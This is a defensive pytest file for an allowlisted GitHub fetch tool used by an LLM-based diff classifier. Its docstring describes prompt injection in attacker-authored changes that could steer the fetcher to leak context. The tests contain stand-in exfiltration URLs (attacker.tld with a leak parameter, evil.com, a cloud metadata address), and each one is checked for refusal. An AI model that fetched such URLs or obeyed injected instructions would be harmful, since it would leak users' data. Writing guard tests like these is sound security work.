"""The GitHub-allowlisted enrichment fetch (MF2) — the exfil-critical guard, tested offline.

The change under classification is attacker-authored, so an injected instruction could try to steer the
fetcher to a non-GitHub URL to exfiltrate context. These tests pin: only GitHub hosts are reachable,
every REDIRECT HOP is re-checked against the allowlist AND the DNS-rebinding resolved-IP guard, and the
byte/redirect caps hold. A fake httpx keeps it offline; `resolved_host_is_safe` is monkeypatched to
isolate the allowlist vs. the rebinding check.
"""

from __future__ import annotations

import sys
import types

import diff_sentry.fetch_tool as ft
from diff_sentry.config import DetectConfig
from diff_sentry.fetch_tool import _host_allowed, make_github_fetch_tool


def _cfg(**kw):
    return DetectConfig(main_model="x", sub_model="x", classifier_model="x", **kw)


class _Resp:
    def __init__(self, *, redirect=None, body=b"file-contents", status=200):
        self.is_redirect = redirect is not None
        self.headers = {"location": redirect} if redirect else {}
        self._body = body
        self.status_code = status

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def iter_bytes(self):
        return iter([self._body])


class _Client:
    queue: list = []

    def __init__(self, **kw):
        pass

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def stream(self, method, url):
        return _Client.queue.pop(0)


class _URL:
    def __init__(self, u):
        self._u = u

    def join(self, loc):          # tests use ABSOLUTE redirect targets
        return _URL(loc)

    def __str__(self):
        return self._u


def _install_fake_httpx(monkeypatch, responses):
    _Client.queue = list(responses)
    monkeypatch.setitem(sys.modules, "httpx", types.SimpleNamespace(Client=_Client, URL=_URL))
    monkeypatch.setattr(ft, "resolved_host_is_safe", lambda *a, **k: True)   # isolate the allowlist


# ── allowlist logic (pure, no network) ────────────────────────────────────────────────────────────

def test_host_allowed_logic():
    hosts = ("api.github.com", "objects.githubusercontent.com")
    assert _host_allowed("https://api.github.com/repos/o/r", hosts)
    assert not _host_allowed("https://evil.com/x", hosts)
    assert not _host_allowed("https://api.github.com.evil.com/x", hosts)     # suffix-spoof rejected


def test_non_github_url_refused_before_any_request():
    out = make_github_fetch_tool(_cfg())("https://attacker.tld/?leak=secrets")
    assert "Refused" in out and "GitHub host" in out


def test_internal_metadata_url_refused():
    out = make_github_fetch_tool(_cfg())("http://169.254.169.254/latest/meta-data/")
    assert "Refused" in out


# ── the redirect edge (fetch_tool.py per-hop re-check) ─────────────────────────────────────────────

def test_github_redirect_to_allowlisted_host_is_followed(monkeypatch):
    _install_fake_httpx(monkeypatch, [
        _Resp(redirect="https://objects.githubusercontent.com/blob/1"),
        _Resp(body=b"the-file-body"),
    ])
    out = make_github_fetch_tool(_cfg())("https://api.github.com/repos/o/r/contents/x")
    assert "the-file-body" in out


def test_redirect_off_allowlist_is_refused(monkeypatch):
    _install_fake_httpx(monkeypatch, [_Resp(redirect="https://attacker.tld/?leak=ctx")])
    out = make_github_fetch_tool(_cfg())("https://api.github.com/x")
    assert "Refused" in out and "allowlist" in out.lower()


def test_dns_rebind_is_refused(monkeypatch):
    _install_fake_httpx(monkeypatch, [_Resp(body=b"x")])
    monkeypatch.setattr(ft, "resolved_host_is_safe", lambda *a, **k: False)  # a GitHub host that resolves internal
    out = make_github_fetch_tool(_cfg())("https://api.github.com/x")
    assert "Refused" in out and "internal" in out.lower()


def test_max_bytes_cap(monkeypatch):
    _install_fake_httpx(monkeypatch, [_Resp(body=b"A" * 10_000)])
    out = make_github_fetch_tool(_cfg(fetch_max_bytes=100))("https://api.github.com/x")
    assert len(out) <= 100


def test_too_many_redirects_refused(monkeypatch):
    _install_fake_httpx(monkeypatch, [_Resp(redirect=f"https://api.github.com/{i}") for i in range(6)])
    out = make_github_fetch_tool(_cfg())("https://api.github.com/0")
    assert "too many redirects" in out.lower()
